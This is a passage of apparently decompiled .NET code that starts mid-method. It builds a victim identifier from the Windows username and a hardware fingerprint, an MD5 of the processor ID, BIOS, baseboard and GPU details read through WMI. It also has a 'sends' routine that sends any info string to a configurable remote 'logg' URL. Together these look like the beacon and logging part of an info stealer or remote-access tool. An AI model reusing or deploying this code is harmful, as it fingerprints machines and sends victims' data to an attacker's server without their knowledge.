        obj = Operators.ConcatenateObject(Operators.ConcatenateObject(Module1.UserName(), (object) "_"), (object) Module1.HWID());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "Error";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static object UserName()
    {
      object obj;
      try
      {
        obj = (object) Environment.UserName;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "Error";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static string HWID()
    {
      string str;
      try
      {
        str = Module1.MD5HASH(Module1.Identifier("Win32_Processor", "ProcessorId") + "-" + Module1.Identifier("Win32_BIOS", "SerialNumber") + "-" + Module1.Identifier("Win32_BaseBoard", "SerialNumber") + "-" + Module1.Identifier("Win32_VideoController", "Name"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Error";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private static string Identifier(string wmiClass, string wmiProperty)
    {
      string str;
      try
      {
        string Left = "";
        ManagementObjectCollection instances = new ManagementClass(wmiClass).GetInstances();
        try
        {
          foreach (ManagementObject managementObject in instances)
          {
            if (Operators.CompareString(Left, "", false) == 0)
            {
              try
              {
                Left = managementObject[wmiProperty].ToString();
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
          }
        }
        finally
        {
          ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
          objectEnumerator?.Dispose();
        }
        str = Left;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Error";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string MD5HASH(string input)
    {
      string str;
      try
      {
        byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(input));
        StringBuilder stringBuilder = new StringBuilder();
        int num = checked (hash.Length - 1);
        int index = 10;
        while (index <= num)
        {
          stringBuilder.Append(hash[index].ToString("x2"));
          checked { ++index; }
        }
        str = stringBuilder.ToString().ToUpper();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Error";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static bool sends(string info)
    {
      bool flag;
      try
      {
        WebResponse response = WebRequest.Create(Class1.Settings.logg + "?" + info).GetResponse();
        StreamReader streamReader = new StreamReader(response.GetResponseStream());
        streamReader.ReadToEnd();
        streamReader.Close();
        response.Close();
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    private enum CryptoAction
    {
      ActionEncrypt = 1,
    }
  }
}
